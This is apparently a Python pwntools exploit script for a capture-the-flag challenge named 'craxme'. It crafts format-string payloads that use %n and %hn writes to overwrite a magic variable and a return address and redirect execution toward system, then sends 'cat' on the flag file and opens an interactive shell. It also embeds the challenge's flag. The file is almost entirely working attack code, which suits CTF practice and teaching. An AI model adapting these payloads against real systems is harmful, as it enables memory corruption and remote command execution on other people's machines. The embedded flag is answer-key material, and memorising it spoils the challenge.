from pwn import *

#FLAG{D0_y0u_l1k3_t0_pl4y_w1th_fmt?}

host = 'csie.ctf.tw'
port = 10142
y = remote(host,port)

magic = 0x804a038
ad = 0x80486e1
phd = 0x8048711
ret = 0x080485a1
main = 0x804854b   # 134513995
system_plt = 0x8048410   # 134513680

flag = 0xda
craxflag = 0xfaceb00c

fmt1 = p32(magic) + '%.' + str( 0xda - 4 ) + 'x%7$n'
fmt2 = p32(magic) + p32(magic + 0x2) + '%.' + str( 0xb00c - 8 ) + 'x%7$hn%.' + str( 0xface - 0xb00c ) + 'x%8$hn'
p = '%x.' * 7 + '%73$x.%79$x.%80$x.%81$x.%82$x.'
p = '%.26739x%81$n%.134486941x%27$n'
fmt3 = p + 'a' * (80 - len(p)) + '\xcc'

a = '%.26739x%81$n'

#b = '%.134513995x%27$nABCD%27$x.%73$x..%79$x'
b = '%.26739x%81$n%.134486941x%27$nABCD%27$x.%73$x..%79$x'
c = b + 'a' * (80 - len(b)) + '\xcc'

y.send( c )

res = y.recvuntil('phd')
print res[-97:]

y.sendline('cat /home/craxme/fllllll4g')
y.interactive()
#print y.recvall()
